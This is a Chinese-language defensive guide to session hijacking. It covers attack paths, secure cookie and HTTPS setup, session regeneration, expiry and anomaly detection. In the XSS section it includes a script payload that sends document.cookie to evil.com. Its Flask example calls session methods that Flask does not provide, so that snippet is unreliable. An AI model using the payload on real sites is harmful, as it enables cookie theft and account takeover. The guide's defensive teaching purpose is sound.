# Session 劫持（Session Hijacking）

## 元数据
- **tier适用**: L1 ✅ | L2 ✅ | L3 ✅
- **领域**: auth（认证安全）
- **严重程度**: critical
- **修复成本**: L1: 免费 | L2: $0-10/月 | L3: 企业方案
- **独立开发者适用度**: ⭐⭐⭐⭐⭐ (5/5)
- **最后验证日期**: 2026-06-11

---

## L1 独立开发者版（速查版）

### 你会遭遇什么（一句话）
攻击者窃取用户Session ID后冒充用户身份操作，导致账号被盗、数据泄露、资金损失，用户全程无感知。

### 一分钟识别
你的产品是否有以下特征：
- [ ] 使用HTTP传输（未强制HTTPS）
- [ ] Cookie未设置 Secure 和 HttpOnly 属性
- [ ] Session ID 在 URL 中传递
- [ ] 登录前后 Session ID 不变（Session固定）
- [ ] 无异地/异常登录检测
→ 勾选≥2项，即需立即关注此风险

### 一句话防御
强制HTTPS + Cookie设置 Secure/HttpOnly/SameSite + 登录后重新生成Session ID。

### 快速行动清单
1. **立即行动**（今天可完成，免费）
   - [ ] 强制HTTPS（使用 Let's Encrypt 免费证书）
   - [ ] Cookie 设置 Secure 和 HttpOnly 属性
   - [ ] 登录成功后重新生成 Session ID

2. **短期行动**（本周可完成，免费）
   - [ ] Cookie 设置 SameSite=Strict 或 Lax
   - [ ] 添加 Session 过期机制（如30分钟无操作过期）
   - [ ] 记录登录IP和User-Agent

3. **长期行动**（规划中，低成本）
   - [ ] 添加异地登录检测和告警
   - [ ] 实现 Session 活跃监控
   - [ ] 关键操作要求二次验证

### 推荐工具
- **免费**：
  - [Let's Encrypt](https://letsencrypt.org/) - 免费SSL证书
  - [Cloudflare](https://www.cloudflare.com/) - 免费SSL + CDN
  - [Mozilla SSL配置生成器](https://ssl-config.mozilla.org/) - 服务器SSL配置

- **低成本**：
  - [Auth0](https://auth0.com/) - 自动Session管理，免费7000用户/月
  - [Supabase Auth](https://supabase.com/auth) - 安全Session，免费50000用户/月

### 验证方法
- [ ] 测试步骤1：访问 http:// 你的域名，应自动跳转 https://
- [ ] 测试步骤2：浏览器开发者工具查看Cookie，应显示 Secure、HttpOnly 标记
- [ ] 测试步骤3：登录前后对比Session ID，应不相同
- [ ] 测试步骤4：长时间无操作后刷新页面，应要求重新登录

---

## L2 小团队版（理解版）

### 场景还原
你的SaaS产品有3000个活跃用户，使用Session-Cookie认证。某天用户反馈"不是我操作的订单"，调查发现：

**攻击链路**：
1. 用户在咖啡厅连接公共WiFi
2. 攻击者通过ARP欺骗监听网络流量
3. 捕获到用户的Session Cookie（因为未使用HTTPS）
4. 攻击者复制Cookie，在自己的浏览器中访问你的网站
5. 服务器认为是合法用户，允许操作

**真实日志**：
```
[2026-06-10 14:32:15] 订单创建 - 用户ID: 1234 - IP: 192.168.1.100 (用户常用IP)
[2026-06-10 14:35:42] 订单创建 - 用户ID: 1234 - IP: 45.33.*.* (攻击者IP)
                                                    ↑ 同一Session，不同IP
[2026-06-10 14:36:00] 敏感操作 - 修改收货地址 - 用户ID: 1234
```

**损失**：
- 用户资金被盗用
- 信任崩塌，用户流失
- 潜在法律责任

### 攻击路径（简化版）

**方式1：网络监听**
1. 攻击者与用户在同一局域网（咖啡厅、机场、公司网络）
2. 使用ARP欺骗/WiFi嗅探捕获流量
3. 提取Cookie中的Session ID
4. 使用窃取的Session ID访问目标网站

**方式2：Session固定攻击**
1. 攻击者获取一个有效Session ID（如 Sess_12345）
2. 诱骗用户点击链接：`https://yoursite.com/login?session=Sess_12345`
3. 用户登录后，Session ID不变（仍为 Sess_12345）
4. 攻击者使用已知Session ID直接访问

**方式3：XSS窃取**
1. 网站存在XSS漏洞
2. 攻击者注入恶意脚本：`<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`
3. 用户访问被注入页面，Cookie发送到攻击者服务器
4. 攻击者使用窃取的Cookie

**方式4：物理访问**
1. 攻击者物理接触用户设备
2. 从浏览器存储或内存中提取Cookie
3. 或直接使用已登录的浏览器

### 防御实施（低成本方案）

#### 方案A：免费方案（纯自建）

**1. HTTPS 强制配置**

```nginx
# Nginx 配置 - 强制HTTPS
server {
    listen 80;
    server_name yourdomain.com;
    
    # 强制跳转HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name yourdomain.com;
    
    # SSL证书配置（Let's Encrypt免费）
    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    
    # SSL安全配置（使用Mozilla推荐配置）
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    
    # HSTS - 强制浏览器使用HTTPS
    add_header Strict-Transport-Security "max-age=63072000" always;
    
    # ... 其他配置
}
```

**获取免费SSL证书**：
```bash
# 使用 Certbot 获取 Let's Encrypt 证书
sudo apt install certbot python3-certbot-nginx
sudo certbot --nginx -d yourdomain.com -d www.yourdomain.com

# 自动续期
sudo certbot renew --dry-run
```

**2. Cookie 安全配置**

```python
# Flask 示例 - 安全Cookie配置
from flask import Flask, session, make_response
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

@app.route('/login', methods=['POST'])
def login():
    # 验证用户凭证
    user = authenticate_user(request.json)
    
    if user:
        # 关键：登录后重新生成Session ID
        session.clear()  # 清除旧Session
        session.regenerate()  # 生成新Session ID（Flask默认支持）
        
        # 设置用户信息
        session['user_id'] = user.id
        session['login_time'] = time.time()
        session['ip'] = request.remote_addr
        session['user_agent'] = request.headers.get('User-Agent')
        
        response = make_response({'success': True})
        
        # 设置安全Cookie
        response.set_cookie(
            'session',
            value=session.sid,  # Session ID
            secure=True,        # 仅HTTPS传输
            httponly=True,      # 禁止JavaScript访问
            samesite='Lax',     # 防止CSRF（推荐）
            max_age=1800,       # 30分钟过期
            path='/'
        )
        
        return response
```

**Express.js 示例**：
```javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis')(session);

const app = express();

app.use(session({
  store: new RedisStore({ url: process.env.REDIS_URL }),
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',  // 自定义Cookie名称（不暴露技术栈）
  resave: false,
  saveUninitialized: false,
  rolling: true,  // 活动时刷新过期时间
  
  cookie: {
    secure: true,      // 仅HTTPS
    httpOnly: true,    // 禁止JS访问
    sameSite: 'strict', // 严格模式
    maxAge: 30 * 60 * 1000  // 30分钟
  }
}));

// 登录时重新生成Session
app.post('/login', (req, res) => {
  const user = authenticateUser(req.body);
  
  if (user) {
    // 重新生成Session ID（防止Session固定）
    req.session.regenerate((err) => {
      if (err) {
        return res.status(500).json({ error: '登录失败' });
      }
      
      // 设置用户信息
      req.session.userId = user.id;
      req.session.loginTime = Date.now();
      req.session.ip = req.ip;
      req.session.userAgent = req.get('User-Agent');
      
      res.json({ success: true, user: { id: user.id } });
    });
  } else {
    res.status(401).json({ error: '凭证错误' });
  }
});
```

**3. Session固定攻击防护**

```python
# 登录前后重新生成Session ID
def login_success(user):
    # 保存旧的Session数据
    old_data = session.copy()
    
    # 清除旧Session
    session.clear()
    
    # 生成新Session ID（框架方法不同）
    # Flask: 自动处理
    # Django: request.session.cycle_key()
    # Express: req.session.regenerate()
    
    # 恢复必要数据
    session.update(old_data)
    session['user_id'] = user.id
    session['auth_time'] = time.time()
```

**4. Session生命周期管理**

```python
# Session过期检查中间件
from datetime import datetime, timedelta
from functools import wraps

def session_expiry_check(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # 检查Session是否过期
        auth_time = session.get('auth_time')
        
        if auth_time:
            # 30分钟无操作过期
            expiry = timedelta(minutes=30)
            if datetime.now() - datetime.fromtimestamp(auth_time) > expiry:
                session.clear()
                return {'error': 'Session已过期，请重新登录'}, 401
            
            # 更新活动时间（滑动过期）
            session['last_activity'] = time.time()
        
        return f(*args, **kwargs)
    return decorated_function

# 应用到所有需要认证的路由
@app.route('/api/protected')
@session_expiry_check
def protected_route():
    return {'data': 'sensitive info'}
```

**5. 异常登录检测**

```python
import geoip2.database
from collections import defaultdict

# 记录用户常用IP和设备
user_fingerprints = defaultdict(list)

def detect_anomaly(user_id, ip, user_agent):
    """检测异常登录"""
    fingerprint = {
        'ip': ip,
        'user_agent': user_agent,
        'location': get_ip_location(ip)
    }
    
    # 获取历史记录
    history = user_fingerprints.get(user_id, [])
    
    # 检查是否为新设备/新位置
    if history:
        last_login = history[-1]
        
        # IP变化检查
        if ip != last_login['ip']:
            # 地理位置变化超过500km
            distance = calculate_distance(
                fingerprint['location'],
                last_login['location']
            )
            
            if distance > 500:
                send_security_alert(user_id, f"检测到异地登录：{fingerprint['location']}")
                return True
    
    # 记录本次登录
    user_fingerprints[user_id].append(fingerprint)
    user_fingerprints[user_id] = user_fingerprints[user_id][-5:]  # 只保留最近5次
    
    return False

def get_ip_location(ip):
    """获取IP地理位置"""
    try:
        reader = geoip2.database.Reader('GeoLite2-City.mmdb')
        response = reader.city(ip)
        return {
            'country': response.country.name,
            'city': response.city.name,
            'lat': response.location.latitude,
            'lon': response.location.longitude
        }
    except:
        return None
```

**局限性**：
- 需要自行维护Session存储（Redis）
- 需要实现IP地理位置检测
- 需要自己实现告警系统

---

#### 方案B：低成本方案（使用认证服务）

**使用 Auth0 安全Session**

```javascript
import { Auth0Client } from '@auth0/auth0-spa-js';

const auth0 = new Auth0Client({
  domain: 'your-domain.auth0.com',
  client_id: 'your-client-id',
  redirect_uri: window.location.origin,
  
  // 安全配置（Auth0自动处理）
  useRefreshTokens: true,  // 使用刷新令牌
  cacheLocation: 'memory',  // 不存储在localStorage
});

// Auth0 自动提供：
// - 安全的Cookie配置
// - Session固定防护
// - 异地登录检测
// - 可疑活动监控
```

**使用 Supabase Auth**

```typescript
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: {
    autoRefreshToken: true,
    persistSession: true,
    detectSessionInUrl: true,
    
    // 存储安全配置
    storage: {
      getItem: (key) => {
        // 使用 HttpOnly Cookie（需要后端配合）
        return getCookie(key);
      },
      setItem: (key, value) => {
        // 自动设置安全Cookie
        setSecureCookie(key, value);
      },
    }
  }
})

// 登录
const { data, error } = await supabase.auth.signInWithPassword({
  email: 'user@example.com',
  password: 'password123',
})

// Supabase 自动提供：
// - 安全的Token存储
// - 自动刷新
// - Session过期管理
// - 异常检测（需在Dashboard配置）
```

**优势**：
- 无需维护Session存储
- 自动处理Session固定防护
- 内置异地登录检测
- 提供管理界面和审计日志
- 免费额度充足

---

#### 方案C：增强方案（+$10-20/月）

在方案B基础上添加：

**1. 实时Session监控**

```typescript
// 活跃Session仪表盘
import { supabase } from './supabase';

async function getActiveSessions(userId: string) {
  // Supabase 不直接提供此功能，需要自己实现
  // 或使用 Auth0 的设备管理功能
  
  // 简单实现：在数据库中记录活跃Session
  const { data } = await supabase
    .from('user_sessions')
    .select('*')
    .eq('user_id', userId)
    .eq('is_active', true)
    .order('last_activity', { ascending: false });
  
  return data;
}

// 用户可以查看并终止其他Session
async function revokeSession(sessionId: string) {
  await supabase
    .from('user_sessions')
    .update({ is_active: false })
    .eq('id', sessionId);
}
```

**2. 关键操作二次验证**

```typescript
// 敏感操作要求重新验证
async function performSensitiveAction() {
  // 检查距离上次验证的时间
  const lastAuth = await getLastAuthTime();
  
  if (Date.now() - lastAuth > 5 * 60 * 1000) {  // 超过5分钟
    // 要求重新输入密码或使用2FA
    const verified = await showReauthDialog();
    
    if (!verified) {
      throw new Error('需要重新验证');
    }
  }
  
  // 执行敏感操作
  return await executeAction();
}
```

---

### 决策树

```
你的产品是否使用Session-Cookie认证？
├── 否（使用JWT等） → 参考 [JWT安全最佳实践](./jwt-security.md)
└── 是 →
    你的网站是否强制HTTPS？
    ├── 否 → 立即配置（Let's Encrypt免费）
    └── 是 →
        Cookie是否设置安全属性？
        ├── 否 → 立即添加 Secure/HttpOnly/SameSite
        └── 是 →
            登录后是否重新生成Session ID？
            ├── 否 → 立即实现（见代码示例）
            └── 是 → 基础防护完成

            是否处理敏感数据？
            ├── 是 → 添加异地登录检测 + Session监控
            └── 否 → 基础防护足够
```

### 完整代码示例

**Next.js 完整Session防护方案**

```typescript
// lib/session.ts - Session管理工具
import { cookies } from 'next/headers';
import { SignJWT, jwtVerify } from 'jose';
import { redirect } from 'next/navigation';

const SESSION_SECRET = new TextEncoder().encode(
  process.env.SESSION_SECRET!
);

interface SessionData {
  userId: string;
  email: string;
  authTime: number;
  ip?: string;
  userAgent?: string;
}

export async function createSession(user: { id: string; email: string }) {
  // 生成新的Session Token（相当于重新生成Session ID）
  const token = await new SignJWT({
    userId: user.id,
    email: user.email,
    authTime: Date.now(),
  })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('30m')
    .sign(SESSION_SECRET);

  // 设置安全Cookie
  cookies().set('session', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 30 * 60,  // 30分钟
    path: '/',
  });

  return token;
}

export async function getSession(): Promise<SessionData | null> {
  const token = cookies().get('session')?.value;
  
  if (!token) {
    return null;
  }

  try {
    const { payload } = await jwtVerify(token, SESSION_SECRET);
    
    // 检查Session是否过期（双重检查）
    if (payload.exp && payload.exp * 1000 < Date.now()) {
      await destroySession();
      return null;
    }
    
    return payload as SessionData;
  } catch {
    await destroySession();
    return null;
  }
}

export async function destroySession() {
  cookies().delete('session');
}

export async function requireAuth(): Promise<SessionData> {
  const session = await getSession();
  
  if (!session) {
    redirect('/login');
  }
  
  return session;
}

// 刷新Session（延长过期时间）
export async function refreshSession() {
  const session = await getSession();
  
  if (session) {
    await createSession({ id: session.userId, email: session.email });
  }
}
```

```typescript
// app/api/auth/login/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { createSession } from '@/lib/session';
import { verifyCredentials } from '@/lib/auth';

export async function POST(request: NextRequest) {
  const { email, password } = await request.json();
  
  // 验证凭证
  const user = await verifyCredentials(email, password);
  
  if (!user) {
    return NextResponse.json(
      { error: '邮箱或密码错误' },
      { status: 401 }
    );
  }
  
  // 创建Session（自动重新生成ID）
  await createSession(user);
  
  // 记录登录信息
  await logLogin(user.id, {
    ip: request.ip || request.headers.get('x-forwarded-for'),
    userAgent: request.headers.get('user-agent'),
    timestamp: Date.now(),
  });
  
  return NextResponse.json({
    success: true,
    user: { id: user.id, email: user.email }
  });
}
```

```typescript
// middleware.ts - 全局Session检查
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  // 强制HTTPS（生产环境）
  if (process.env.NODE_ENV === 'production') {
    if (request.headers.get('x-forwarded-proto') !== 'https') {
      return NextResponse.redirect(
        `https://${request.headers.get('host')}${request.nextUrl.pathname}`,
        301
      );
    }
  }
  
  // 检查受保护路由的Session
  const token = request.cookies.get('session')?.value;
  const isProtected = request.nextUrl.pathname.startsWith('/dashboard') ||
                      request.nextUrl.pathname.startsWith('/api/protected');
  
  if (isProtected && !token) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
  
  return NextResponse.next();
}

export const config = {
  matcher: [
    /*
     * 匹配所有路径，除了：
     * - _next/static (静态文件)
     * - _next/image (图片优化)
     * - favicon.ico
     */
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
};
```

---

## L3 企业版（深耕版）

企业级Session防护需要更完善的体系：

**1. 高级Session管理**
- 分布式Session存储
- Session实时监控仪表盘
- 可疑Session自动终止
- 用户自助Session管理

**2. 行为分析**
- 用户行为画像
- 异常行为检测
- 风险自适应认证

**3. 完整审计**
- 所有Session操作日志
- 事态回放能力
- 取证分析支持

**详细内容请参考企业级案例**：
- [企业级Session管理](../../enterprise/bizsec/auth/session-management-enterprise.md)
- [用户行为分析](../../enterprise/infosec/behavior-analysis.md)

---

## 成本估算总结

| 防护层级 | 月成本 | 实施时间 | 维护成本 | 适用场景 |
|---------|--------|---------|---------|---------|
| L1-基本配置 | $0 | 1小时 | 0.5小时/月 | MVP阶段 |
| L2-方案A（自建） | $0 | 4小时 | 2小时/月 | 技术团队 |
| L2-方案B（SaaS） | $0 | 1小时 | 0小时/月 | 快速上线 |
| L2-方案C（增强） | $10-20 | 3小时 | 1小时/月 | 处理敏感数据 |
| L3-企业级 | $200+ | 需评估 | 专职团队 | 企业级应用 |

---

## 常见问题

**Q: 我的网站已经用HTTPS，为什么还需要设置Cookie Secure属性？**
A: Secure属性确保Cookie只在HTTPS连接下发送，防止降级攻击或混合内容场景下的泄露。

**Q: SameSite应该设置为Strict还是Lax？**
A: 
- Strict：最安全，但会阻止从外部链接带来的登录状态
- Lax：平衡安全和体验，推荐大多数场景使用
- None：需要配合Secure使用，仅用于跨站场景

**Q: Session过期时间应该设置为多长？**
A: 
- 高安全场景：15-30分钟
- 一般应用：30分钟-2小时
- 长期登录：使用"记住我"功能，设置更长过期时间（7-30天）

**Q: JWT和Session-Cookie哪个更安全？**
A: 各有优缺点：
- Session-Cookie：服务端可控，可随时撤销，但需要存储
- JWT：无状态，可扩展性好，但难以撤销
- 推荐使用成熟的认证服务（Auth0/Supabase）

**Q: 如何处理用户在多个设备登录？**
A: 
- 记录所有活跃Session
- 允许用户查看和撤销其他设备
- 异地登录时发送告警邮件

---

## 相关资源

**工具**
- [Let's Encrypt](https://letsencrypt.org/) - 免费SSL证书
- [Certbot](https://certbot.eff.org/) - 自动化证书管理
- [Auth0](https://auth0.com/) - 安全认证服务
- [Supabase Auth](https://supabase.com/auth) - 开源认证服务

**学习资源**
- [OWASP Session Management](https://owasp.org/www-community/vulnerabilities/Broken_authentication_and_session_management)
- [Cookie属性详解](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [SameSite Cookie说明](https://web.dev/samesite-cookies-explained/)

**相关案例**
- [撞库攻击](./credential-stuffing.md)
- [XSS攻击](../api/xss.md)
- [CSRF攻击](../api/csrf.md)
